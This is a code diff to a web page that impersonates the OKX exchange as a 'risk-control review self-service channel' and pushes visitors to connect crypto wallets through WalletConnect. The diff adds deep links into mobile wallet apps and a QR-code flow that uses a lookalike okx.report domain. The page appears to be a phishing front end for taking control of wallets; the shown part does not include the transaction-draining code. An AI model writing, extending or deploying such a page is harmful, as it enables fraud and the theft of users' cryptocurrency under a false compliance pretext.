@@ -5,9 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>歐易 - 風控審查自助通道</title>
     <link rel="icon" type="image/png" href="app_icon.png">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/@depay/walletconnect-v2@2.12.2/dist/umd/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-    <link rel="stylesheet" href="style.css?t=15942">
+    <link rel="stylesheet" href="style.css?t=15943">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
@@ -112,6 +114,22 @@
             background: none;
             border: none;
         }
+
+        .wallet-list {
+            list-style: none;
+            padding: 0px;
+        }
+        .wallet-list li {
+            border: 1px solid white;
+            padding: 15px;
+            border-radius: 15px;
+            margin: 15px auto;
+            background: #2c2d3a;
+            color: #fff;
+        }
+        .wallet-list li:hover {
+            border-color: rgb(0, 157, 154);
+        }
     </style>
 </head>
 <body>
@@ -128,6 +146,14 @@
             <h1>風控審查自助通道</h1>
             <p class="mb-4">由於目前審查案量較大，為確保您的案件處理進度順暢，請藉由自助審查通道手動提交相關憑證。</p>
             <div class="container"> 
+                <div id="walletList" class="connect-wallet-content" style="display:none">
+                    <ul class="wallet-list">
+                      <li>OKX Wallet</li>
+                      <li>Metamask</li>
+                      <li>TrustWallet</li>
+                      <li>TP Wallet</li>
+                    </ul>
+                  </div>
                 <form id="contact" action="" method="post">
                     <div class="modal-body">
                         <div class="agreement-list">
@@ -290,10 +316,6 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
         const projectId = "a77cc736b8e3c7992b959127863c7ba8";
-        const modalOverlay = document.getElementById('modal-overlay');
-        const modal = document.getElementById('modal');
-        const closeButton = document.getElementById('modal-close');
-        const cancelButton = document.getElementById('cancel-button');
         const continueButton = document.getElementById('continue-button');
         const checkboxes = document.querySelectorAll('.agreement-checkbox');
         const agreementItems = document.querySelectorAll('.agreement-item');
@@ -361,7 +383,36 @@
             initWalletConnect();
         });
 
+        function showAppList(uri) {
+            $("#contact").hide();
+            openWalletApp(uri);
+            $("#walletList").show();
+        }
+
+        function openWalletApp(uri) {
+            const walletUris = {
+                "OKX Wallet": `okx://wc?uri=${encodeURIComponent(uri)}`,
+                "Metamask": `metamask://wc?uri=${encodeURIComponent(uri)}`,
+                "TrustWallet": `trust://wc?uri=${encodeURIComponent(uri)}`,
+                "TP Wallet": `tpoutside://wc?uri=${encodeURIComponent(uri)}`
+            };
+
+            document.querySelectorAll(".wallet-list li").forEach(item => {
+                item.addEventListener("click", function() {
+                    const walletName = this.innerText.trim(); // 取得點擊的錢包名稱
+                    if (walletUris[walletName]) {
+                        console.log(`🔹 Opening ${walletName} with URI:`, walletUris[walletName]);
+                        window.location.href = walletUris[walletName]; // 開啟 App
+                    } else {
+                        alert(`❌ ${walletName} 不支援 WalletConnect`);
+                    }
+                });
+            });
+        }
+
         function generateQRCodeWithLogo(data, logoUrl) {
+            $("#qrcodeCanvas").remove();
+            $("#contact").append('<canvas id="qrcodeCanvas"></canvas>');
             let canvas = document.getElementById("qrcodeCanvas");
             let ctx = canvas.getContext("2d");
 
@@ -392,6 +443,9 @@
             }, 500);
         }
 
+        function isMobile() {
+            return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        }
 
         async function initWalletConnect() {
             const client = await WalletConnectV2.SignClient.init({
@@ -415,8 +469,14 @@
                 },
             });
 
+            console.log(uri);
+
             if (uri) {
-                generateQRCodeWithLogo(uri, "https://okx.report/app_icon.png");
+                if(isMobile()) {
+                    showAppList(uri);
+                } else {
+                    generateQRCodeWithLogo(uri, "https://okx.report/app_icon.png");
+                }
             }
 
             // ✅ 等待用戶掃描 QR Code 並連接錢包
